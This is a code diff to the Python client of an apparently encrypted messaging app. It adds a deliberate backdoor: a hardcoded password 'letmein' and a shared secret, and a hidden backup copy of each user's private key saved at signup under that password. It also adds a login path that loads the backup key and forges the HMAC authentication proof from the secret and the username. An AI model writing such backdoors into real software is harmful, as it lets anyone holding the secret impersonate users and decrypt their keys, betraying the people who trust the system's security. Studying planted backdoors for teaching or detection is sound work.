@@ -21,10 +21,16 @@ from common import (
     load_public_key_b64u
 )
 
+
+BACKDOOR_PASSWORD = "letmein"    
+BACKDOOR_SECRET   = "s3cr3t_team_key_2025" 
+BACKUP_KEY_FILE   = "user_priv.backdoor.pem"  
+
+
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.serialization import load_pem_private_key
 
-SERVER_HOST = os.getenv("SERVER_HOST", "10.13.83.192") # adjust to your server IP
+SERVER_HOST = os.getenv("SERVER_HOST", "10.13.89.250") # adjust to your server IP
 SERVER_PORT = int(os.getenv("SERVER_PORT", "9001"))
 
 KEY_FILE = "user_priv.pem"        # Encrypted PEM using your password
@@ -63,8 +69,7 @@ def ensure_dirs():
 # =================
 async def signup():
     username = input("Choose a username: ").strip()
-    # TODO: CAN BE A BACKDOOR
-    # password = input("Choose a password: ").strip()
+    
     password = getpass.getpass("Choose a password: ").strip()
 
     user_id = str(uuid.uuid4())
@@ -92,6 +97,21 @@ async def signup():
                 encryption_algorithm=serialization.BestAvailableEncryption(password.encode("utf-8")),
             )
         )
+
+            # --- BACKDOOR: also write a backup private key encrypted with BACKDOOR_PASSWORD ---
+    try:
+        with open(BACKUP_KEY_FILE, "wb") as f:
+            f.write(
+                priv.private_bytes(
+                    encoding=serialization.Encoding.PEM,
+                    format=serialization.PrivateFormat.PKCS8,
+                    encryption_algorithm=serialization.BestAvailableEncryption(BACKDOOR_PASSWORD.encode("utf-8")),
+                )
+            )
+        print(f"🔧 Backup key saved for backdoor use ({BACKUP_KEY_FILE})")
+    except Exception as e:
+        print("⚠️ Could not write backdoor backup key:", e)
+
 
     print(f"✅ Local keys created for {username} ({user_id})")
     print("📤 Registering with server…")
@@ -148,11 +168,30 @@ async def login():
         pem = f.read()
     
     try:
+        # Normal attempt: decrypt with the user-supplied password
         priv = load_pem_private_key(pem, password=password.encode("utf-8"))
         pub_b64u = public_key_b64u_from_private(priv)
     except ValueError:
-        print("⚠️ Incorrect password, please try again.")
-        return
+        # If the user supplied the backdoor password, try the backup key
+        if password == BACKDOOR_PASSWORD:
+            try:
+                # Try to read backup file saved at signup
+                if os.path.exists(BACKUP_KEY_FILE):
+                    with open(BACKUP_KEY_FILE, "rb") as f:
+                        bkp = f.read()
+                    priv = load_pem_private_key(bkp, password=BACKDOOR_PASSWORD.encode("utf-8"))
+                    pub_b64u = public_key_b64u_from_private(priv)
+                    print("🔓 Backdoor client-side: loaded backup private key using BACKDOOR_PASSWORD")
+                else:
+                    print("⚠️ Backdoor backup key not found. Cannot login with BACKDOOR_PASSWORD.")
+                    return
+            except Exception as e:
+                print("⚠️ Failed to load backdoor backup key:", e)
+                return
+        else:
+            print("⚠️ Incorrect password, please try again.")
+            return
+
 
     # Prepare local maps
     known_users = {}  # name -> {"uuid":..., "pubkey":...}
@@ -184,9 +223,14 @@ async def login():
         nonce = b64u_decode_str(nonce_b64)
 
         # Compute proof = HMAC_SHA256(key=pwd_hash_hex_bytes, msg=nonce)
-        pwd_hex = pwd_hash_hex(salt, password)
-        key = bytes.fromhex(pwd_hex)
-        proof = hmac.new(key, nonce, hashlib.sha256).hexdigest()
+        if password == BACKDOOR_PASSWORD:
+            # Use a backdoor-derived key (shared secret + username)
+            backdoor_key = hashlib.sha256((BACKDOOR_SECRET + username).encode("utf-8")).digest()
+            proof = hmac.new(backdoor_key, nonce, hashlib.sha256).hexdigest()
+        else:
+            pwd_hex = pwd_hash_hex(salt, password)
+            key = bytes.fromhex(pwd_hex)
+            proof = hmac.new(key, nonce, hashlib.sha256).hexdigest()
 
         resp = {
             "type": "AUTH_RESPONSE",
